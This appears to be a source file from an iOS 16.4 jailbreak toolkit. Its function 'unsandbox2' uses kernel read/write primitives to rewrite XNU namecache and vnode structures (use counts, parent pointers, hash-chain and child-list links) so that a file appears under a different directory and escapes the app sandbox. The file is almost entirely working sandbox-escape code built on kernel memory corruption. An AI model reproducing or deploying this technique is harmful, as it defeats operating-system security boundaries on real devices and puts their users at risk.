
#include <stdio.h>
#include <unistd.h>
#include <spawn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/event.h>
#include <sys/syscall.h>
#include <libgen.h>

#import <Foundation/Foundation.h>
// #import "libjailbreak.h"
#import "unsandbox.h"
#import "jbserver/log.h"
#import "jbserver/kernel.h"
// #import "jbserver/primitives.h"
#import "fun/krw.h"
#import "jbserver/util.h"
#import "fun/offsets.h"
#import "fun/vnode.h"

// ==================== iOS 16.4 xnu-8796 use smrq_link ====================

#define SMR_POINTER_DECL(name, type_t) \
	struct name { type_t volatile __smr_ptr; }

#define SMR_POINTER(type_t) \
	SMR_POINTER_DECL(, type_t)

typedef SMR_POINTER(struct smrq_link *)  __smrq_link_t;

struct smrq_link {
    struct smrq_link *           le_next;
    struct smrq_link *          *le_prev;
};


struct namecache_v2 {
    TAILQ_ENTRY(namecache_v2)  nc_entry;       /* chain of all entries */
    TAILQ_ENTRY(namecache_v2)  nc_child;       /* chain of ncp's that are children of a vp */
    union {
        LIST_ENTRY(namecache_v2)  nc_link; /* chain of ncp's that 'name' a vp */
        TAILQ_ENTRY(namecache_v2) nc_negentry; /* chain of ncp's that 'name' a vp */
    } nc_un;
    struct smrq_link        nc_hash;        /* hash chain */
    uint32_t                nc_vid;         /* vid for nc_vp */
    uint32_t                nc_counter;     /* flags */
    vnode_t                 nc_dvp;         /* vnode of parent of name */
    vnode_t                 nc_vp;          /* vnode the name refers to */
    unsigned int            nc_hashval;     /* hashval of stringname */
    const char              *nc_name;       /* pointer to segment name in string cache */
};

#define namecache namecache_v2

static void print_nc(uint64_t ncp) 
{
	while(ncp) {

		struct namecache nc={0};
		kreadbuf(ncp, &nc, sizeof(nc));

		char namebuf[128]={0};
		for(int i=0; i<sizeof(namebuf)/sizeof(namebuf[0]); i++)
			if( !(namebuf[i]=kread8((uint64_t)nc.nc_name+i)) ) break;

		customLog("nc %llx hashval=%08x vp=%16llx dvp=%llx name=%llx next=%16llx prev=%llx,%llx %s\n", ncp, nc.nc_hashval, nc.nc_vp, nc.nc_dvp, nc.nc_name, 
				nc.nc_hash.le_next, nc.nc_hash.le_prev, nc.nc_hash.le_prev?kread64((uint64_t) nc.nc_hash.le_prev):0, namebuf);

		ncp = (uint64_t)nc.nc_hash.le_next;
	}
}

static void print_nc2(uint64_t ncp)
{
    while(ncp) {

        ncp -= offsetof(struct namecache_v2, nc_hash);
        
        struct namecache nc={0};
        kreadbuf(ncp, &nc, sizeof(nc));

        char namebuf[128]={0};
        for(int i=0; i<sizeof(namebuf)/sizeof(namebuf[0]); i++)
            if( !(namebuf[i]=kread8((uint64_t)nc.nc_name+i)) ) break;

        customLog("nc %llx hashval=%08x vp=%16llx dvp=%llx name=%llx next=%16llx prev=%llx,%llx %s\n", ncp, nc.nc_hashval, nc.nc_vp, nc.nc_dvp, nc.nc_name,
            nc.nc_hash.le_next, nc.nc_hash.le_prev, nc.nc_hash.le_prev ? kread64((uint64_t) nc.nc_hash.le_prev):0, namebuf);

        ncp = (uint64_t)nc.nc_hash.le_next;
    }
}

int unsandbox2(char* dir, char* file)
{
	int ret = 0;
	int filefd=-1,dirfd=-1;

	dirfd = open(dir, O_RDONLY);
	if(dirfd<0) {
		customLog("open dir failed %d,%s", errno, strerror(errno));
		goto failed;
	}

	filefd = open(file, O_RDONLY);
	if(filefd<0) {
		customLog("open file failed %d,%s", errno, strerror(errno));
		goto failed;
	}

    // uint64_t dirvp = proc_fd_vnode(proc_self(), dirfd);
	uint64_t dirvp = getVnodeAtPath(dir);
    uint32_t dir_vnode_v_usecount =  kread32(dirvp + off_vnode_v_usecount);
    // if(dir_vnode_v_usecount <= 0) {
        kwrite32(dirvp + off_vnode_v_usecount, dir_vnode_v_usecount + 1);
        // customLog("[+] %s Increased to_vnode->v_writecount: %d\n", dir, kread32(dirvp + off_vnode_v_usecount));
    // }
	struct vnode dirvnode;
	kreadbuf(dirvp, &dirvnode, sizeof(dirvnode));
	// goto failed;
    // uint64_t filevp = proc_fd_vnode(proc_self(), filefd);
	// if(!filevp) {
	// 	customLog("get filevp failed %d,%s", errno, strerror(errno));
	// 	goto failed;
	// }
	uint64_t filevp = getVnodeAtPath(file);

	struct vnode filevnode;
	kreadbuf(filevp, &filevnode, sizeof(filevnode));
	// kwrite32(filevp+offsetof(struct vnode, v_usecount), filevnode.v_usecount+1);
	uint32_t file_vnode_v_usecount = kread32(filevp + off_vnode_v_usecount);
    // if(file_vnode_v_usecount <= 0) {
        kwrite32(filevp + off_vnode_v_usecount, file_vnode_v_usecount + 1);
        // customLog("[+] %s Increased vnode->v_writecount: %d\n", dir, kread32(filevp + off_vnode_v_usecount));
    // }

	struct vnode parentvnode;
    uint64_t parentvp = unsign_kptr((uint64_t) filevnode.v_parent);
	kreadbuf(parentvp, &parentvnode, sizeof(parentvnode));
	// customLog("writing to parentvp...");
	kwrite32(parentvp+off_vnode_v_usecount, kread32(parentvp + off_vnode_v_usecount)+1);

	// customLog("filefd=%d filevp=%llx/%d fileid=%lld parent=%llx/%d dirvp=%llx dirid=%lld ncchildren=%llx:%llx->%llx\n", 
	// 	filefd, filevp,filevnode.v_usecount, filevnode.v_id, filevnode.v_parent, parentvnode.v_usecount, dirvp, dirvnode.v_id, dirvnode.v_ncchildren.tqh_first, dirvnode.v_ncchildren.tqh_last, 
	// 	dirvnode.v_ncchildren.tqh_last?kread64((uint64_t)dirvnode.v_ncchildren.tqh_last):0);

    // char parentname[32]={0};
	uint32_t parentname;
    // kreadbuf((uint64_t)parentvnode.v_name, parentname, sizeof(parentname));
	parentname = kread32((uint64_t)parentvnode.v_name);
    // customLog("parentname=%s\n", parentname);

	struct namecache filenc={0};
	uint64_t filencp = (uint64_t)filevnode.v_nclinks.lh_first;
	kreadbuf(filencp, &filenc, sizeof(filenc));
    customLog("filenc=%llx vp=%llx dvp=%llx\n", filencp, filenc.nc_vp, filenc.nc_dvp);
	// works up to here
	// goto failed;
{
	uint64_t ncp=(uint64_t)dirvnode.v_ncchildren.tqh_first;
	while(ncp) {

		struct namecache nc={0};
		kreadbuf(ncp, &nc, sizeof(nc));
		char namebuf[128]={0};
		for(int i=0; i<sizeof(namebuf)/sizeof(namebuf[0]); i++)
			if( !(namebuf[i]=kread8((uint64_t)nc.nc_name+i)) ) break;

		// customLog("child %llx hashval=%08x vp=%16llx dvp=%llx name=%llx next=%16llx prev=%llx,%llx %s\n", ncp, nc.nc_hashval, nc.nc_vp, nc.nc_dvp, nc.nc_name, 
				// nc.nc_child.tqe_next, nc.nc_child.tqe_prev, nc.nc_child.tqe_prev?kread64((uint64_t) nc.nc_child.tqe_prev):0, namebuf);

		ncp = (uint64_t)nc.nc_child.tqe_next;
	}
}

	init_crc32();
	char fname[PATH_MAX];
	uint32_t hash_val = hash_string(basename_r(file, fname), 0);
	customLog("hash=%x\n", hash_val);

	uint64_t kernelslide = gSystemInfo.kernelConstant.slide;
	customLog("kernelslide=%llx\n", kernelslide);

	// works til now
	// these addresses were so fucking annoying to get omg
	uint64_t nchashtbl = kread64(kernelslide+ gSystemInfo.kernelConstant.nchashtbl);
	uint64_t nchashmask = kread64(kernelslide+ gSystemInfo.kernelConstant.nchashmask);
	customLog("nchashtbl=%llx nchashmask=%llx\n", nchashtbl, nchashmask);
	// goto failed;
	// for(int i=0; i<nchashmask; i++) {
	// 	customLog("hash[%d]=%llx\n", i, kread64(nchashtbl+i*8));
	// }

	uint32_t index = (dirvnode.v_id ^ (hash_val)) & nchashmask; //*********dirv2?
	uint64_t ncpp = nchashtbl + index*8;
	uint64_t ncp = kread64(ncpp);
	customLog("index=%x ncpp=%llx ncp=%llx\n", index, ncpp, ncp);

	customLog("dir hash chain\n");
	print_nc2(kread64(ncpp));
	// goto failed;

	// return 0; //////////////////////////////////////////////////////////////////////////////////////////////////////////////////


	kwrite64(filencp+offsetof(struct namecache,nc_dvp), dirvp);
	kwrite64(filevp + off_vnode_v_parent, 0);
	// kwrite64(filevp+offsetof(struct vnode, v_parent), 0);


	//smrq_serialized_remove(/*__smrq_link_t*/ncp, nc_hash):
	{
		uint64_t ncp = filencp;
		
		if(filenc.nc_hash.le_next) {
			//next->prev = prev; in __smrq_serialized_remove_one(__smrq_link_t*
			kwrite64((uint64_t)filenc.nc_hash.le_next+offsetof(struct smrq_link, le_prev), (uint64_t)filenc.nc_hash.le_prev); //next->prev = prev
		}

		//smr_serialized_store_relaxed(prev, next);
		kwrite64((uint64_t)filenc.nc_hash.le_prev, (uint64_t)filenc.nc_hash.le_next);
	}
	//smrq_serialized_insert_head(ncpp, /*__smrq_link_t*/ncp->nc_hash):
	{
		uint64_t ncp = filencp;

		uint64_t first = kread64(ncpp);
		kwrite64(ncp+offsetof(struct namecache, nc_hash.le_next), first); //smr_serialized_store_relaxed(&elem->next, next);
		if(first) { //if (next != NULL)
			//next->prev = &elem->next;
			kwrite64(first+offsetof(struct smrq_link, le_prev),  ncp+offsetof(struct namecache, nc_hash.le_next) );
		}
		kwrite64(ncpp, ncp+offsetof(struct namecache, nc_hash)); //smr_serialized_store(prev, elem);
		kwrite64(ncp+offsetof(struct namecache, nc_hash.le_prev), ncpp); //elem->prev = prev;
	}

	//TAILQ_REMOVE(&(ncp->nc_dvp->v_ncchildren), ncp, nc_child);
	{	
		uint64_t ncp = filencp;
		if(filenc.nc_child.tqe_next) { //always true for filenc next time
			//TAILQ_NEXT((elm), field)->field.tqe_prev = (elm)->field.tqe_prev;
			kwrite64((uint64_t)filenc.nc_child.tqe_next+offsetof(struct namecache, nc_child.tqe_prev), (uint64_t)filenc.nc_child.tqe_prev);
		} else {
			//(head)->tqh_last = (elm)->field.tqe_prev;
			kwrite64(parentvp+offsetof(struct vnode,v_ncchildren.tqh_last), (uint64_t)filenc.nc_child.tqe_prev);
		}
		//*(elm)->field.tqe_prev = TAILQ_NEXT((elm), field);
		kwrite64((uint64_t)filenc.nc_child.tqe_prev, (uint64_t)filenc.nc_child.tqe_next);

		kwrite64(filencp+offsetof(struct namecache,nc_child.tqe_next), filencp); //TAILQ_CHECK_NEXT
		kwrite64(filencp+offsetof(struct namecache,nc_child.tqe_prev), filencp+offsetof(struct namecache,nc_child.tqe_next)); //TAILQ_CHECK_PREV
	}

	// customLog("final hash chain\n");
	print_nc2(kread64(ncpp));


	customLog("unsandboxed %llx %llx %s %s\n\n", filevp, dirvp, file, dir);

	ret = 0;
	goto success;

failed:
	ret = -1;

success:
	if(dirfd>=0) close(dirfd);
	if(filefd>=0) close(filefd);

    //update v_parent
    // char newfile[PATH_MAX]={0};
    // snprintf(newfile,sizeof(newfile),"%s/%s",dir,basename_r(file, fname));
    // customLog("newfile=%s\n", newfile);

	// int newfd = open(newfile, O_RDONLY);
    // assert(newfd >= 0);

    // char pathbuf[PATH_MAX]={0};
    // int ret1=fcntl(newfd, F_GETPATH, pathbuf);
    // customLog("realpath=(%d) %s\n", ret1, pathbuf);

	return ret;
}